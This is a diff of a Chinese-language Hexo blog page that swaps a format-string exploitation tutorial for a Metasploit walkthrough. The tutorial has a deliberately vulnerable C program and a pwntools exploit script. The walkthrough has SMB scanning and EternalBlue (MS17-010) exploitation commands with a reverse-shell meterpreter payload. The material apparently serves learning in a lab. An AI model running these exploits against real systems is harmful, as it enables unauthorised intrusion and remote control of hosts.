@@ -6,22 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>PWN2 | Hexo</title>
+  <title>MSF | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–格式化字符串">
+  <meta name="description" content="记录每天的进步，只有努力不会背叛自己！ MSF 使用ms17-010渗透测试">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PWN2">
-<meta property="og:url" content="http://yoursite.com/2017/09/19/pwn2/index.html">
+<meta property="og:title" content="MSF">
+<meta property="og:url" content="http://yoursite.com/2017/09/20/msf_17_010/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–格式化字符串">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006rgqhqgy1fjp192ut8dj306q06naak.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1emgyl8j309r02r3y9.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1fqmjamj30o807y77a.jpg">
-<meta property="og:updated_time" content="2017-09-19T10:18:46.464Z">
+<meta property="og:description" content="记录每天的进步，只有努力不会背叛自己！ MSF 使用ms17-010渗透测试">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006rgqhqgy1fjq6coff4sj30ga04jdgu.jpg">
+<meta property="og:updated_time" content="2017-09-20T10:06:03.667Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PWN2">
-<meta name="twitter:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–格式化字符串">
-<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006rgqhqgy1fjp192ut8dj306q06naak.jpg">
+<meta name="twitter:title" content="MSF">
+<meta name="twitter:description" content="记录每天的进步，只有努力不会背叛自己！ MSF 使用ms17-010渗透测试">
+<meta name="twitter:image" content="http://ww2.sinaimg.cn/large/006rgqhqgy1fjq6coff4sj30ga04jdgu.jpg">
   
   
     <link rel="icon" href="/favicon.png">
@@ -163,36 +161,30 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-pwn2" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-msf_17_010" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      PWN2
+      MSF
     </h1>
   
 
         
-        <a href="/2017/09/19/pwn2/" class="archive-article-date">
-  	<time datetime="2017-09-19T10:08:08.505Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-19</time>
+        <a href="/2017/09/20/msf_17_010/" class="archive-article-date">
+  	<time datetime="2017-09-20T02:42:20.255Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-20</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>记录每天的进步，只有努力不会背叛自己！每天学习一点PWN</p>
-<h1 id="PWN从开始到开始–格式化字符串"><a href="#PWN从开始到开始–格式化字符串" class="headerlink" title="PWN从开始到开始–格式化字符串"></a>PWN从开始到开始–格式化字符串</h1><a id="more"></a>
-<h2 id="1、格式化字符串"><a href="#1、格式化字符串" class="headerlink" title="1、格式化字符串"></a>1、格式化字符串</h2><p>函数:<br>int printf(const char *format, [argument]);<br>printf()函数的调用格式为: printf(“&lt;格式化字符串&gt;”, &lt;参量表&gt;)。<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fjp192ut8dj306q06naak.jpg" alt=""></p>
-<p>基本的格式化字符串参数<br>%c：输出字符，配上%n可用于向指定地址写数据。<br>%d：输出十进制整数，配上%n可用于向指定地址写数据。<br>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。<br>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。<br>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。<br>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x10$n (%100d10$n)表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。<br>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p>
-<h2 id="2、源码"><a href="#2、源码" class="headerlink" title="2、源码"></a>2、源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line">int a = 123, b = 456;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	int c = 789;</div><div class="line">	char s[100];</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;c);</div><div class="line">	scanf(<span class="string">"%s"</span>, s);</div><div class="line">	<span class="built_in">printf</span>(s);   //格式化，利用参数传递，打印出我们需要的地址</div><div class="line"><span class="keyword">if</span> (c == 16) </div><div class="line">&#123;</div><div class="line">	puts(<span class="string">"modified c."</span>);</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (a == 2) </div><div class="line">	&#123;</div><div class="line">	puts(<span class="string">"modified a for a small number."</span>);</div><div class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == 0x12345678)</div><div class="line">		&#123;</div><div class="line">			puts(<span class="string">"modified b for a big number!"</span>);</div><div class="line">		&#125;</div><div class="line">	<span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>生成文件<br><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o fmt fmt.c</code></p>
-<h2 id="3、分析"><a href="#3、分析" class="headerlink" title="3、分析"></a>3、分析</h2><p>ida调试,因为a，b都是全局变量，找到a,b的地址<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1emgyl8j309r02r3y9.jpg" alt=""><br>gdb调试<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1fqmjamj30o807y77a.jpg" alt=""></p>
-<p>确定输入的是第6个参数</p>
-<h2 id="4、exp"><a href="#4、exp" class="headerlink" title="4、exp"></a>4、exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">def ha():</div><div class="line">    p = process(<span class="string">'./fmt'</span>)</div><div class="line">    c_addr = int(p.recvuntil(<span class="string">'\n'</span>),16)</div><div class="line">    a_addr = 0x804A024</div><div class="line">    b_addr = 0x804A028</div><div class="line">    <span class="built_in">print</span> hex(c_addr)</div><div class="line">    raw_input()</div><div class="line">    payloadc = p32(c_addr)+<span class="string">'%12x'</span>+<span class="string">'%6$n'</span></div><div class="line">    payloada = <span class="string">'aa'</span>+<span class="string">'%8$n'</span>+<span class="string">'aa'</span>+p32(a_addr)</div><div class="line">    payloadb= p32(b_addr)+p32(b_addr+1)+p32(b_addr+2)+p32(b_addr+3)+<span class="string">'%104x'</span>+<span class="string">'%6$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%7$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%8$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%9$hhn'</span></div><div class="line">    p.sendline(payloadb)</div><div class="line">    <span class="built_in">print</span> p.recv()</div><div class="line">    p.interactive()</div><div class="line">ha()</div></pre></td></tr></table></figure>
-<p>这个exp解释一下：%12x表示填充12个字节。特别payloada的时候，%8$n是字符输入的，所以占4个字节，所以地址是在第8个参数，但是输出不会打印出来，所以下面的构造payloadb时候，%x$n不算在字节。</p>
+        <p>记录每天的进步，只有努力不会背叛自己！</p>
+<h1 id="MSF-使用ms17-010渗透测试"><a href="#MSF-使用ms17-010渗透测试" class="headerlink" title="MSF 使用ms17-010渗透测试"></a>MSF 使用ms17-010渗透测试</h1><a id="more"></a>
+<h2 id="1、漏洞检测"><a href="#1、漏洞检测" class="headerlink" title="1、漏洞检测"></a>1、漏洞检测</h2><p>运行数据库<br><code>service postgresql start</code><br>启动msfconsole<br><code>msfconsole -q</code><br>运行smb模块探测主机445端口开放情况<br><code>use auxiliary/scanner/smb/smb_version</code><br>设置目标和运行线程<br><code>set rhosts 192.168.31.0/24</code><br><code>set threads 50</code><br>结果：<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fjq6coff4sj30ga04jdgu.jpg" alt=""><br>使用smb_ms17_010模块探测MS17-010漏洞<br><code>use auxiliary/scanner/smb/smb_ms17_010</code><br>命令查看刚才扫描结果<br><code>services -r tcp -p 445 -R</code></p>
+<h2 id="2、把扫描结果进行ms17-010漏洞检测"><a href="#2、把扫描结果进行ms17-010漏洞检测" class="headerlink" title="2、把扫描结果进行ms17-010漏洞检测"></a>2、把扫描结果进行ms17-010漏洞检测</h2><p>使用攻击模块<br><code>use exploit/windows/smb/ms17_010_eternalblue</code><br>option（or info）查看参数<br><code>set rhost 192.168.31.94</code><br><code>set lhost 192.168.31.115</code><br><code>set payload windows/x64/meterpreter/reverse_tcp</code><br>run运行</p>
 
       
 
@@ -277,7 +269,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/09/19/pwn2/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/09/20/msf_17_010/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -291,7 +283,7 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/09/20/ctf_start/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2017/09/20/SFX/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
@@ -301,8 +293,8 @@
     </a>
   
   
-    <a href="/2017/09/19/pwn1/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">PWN1</div>
+    <a href="/2017/09/20/ctf_start/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">RE</div>
       <i class="icon-circle-right"></i>
     </a>
   
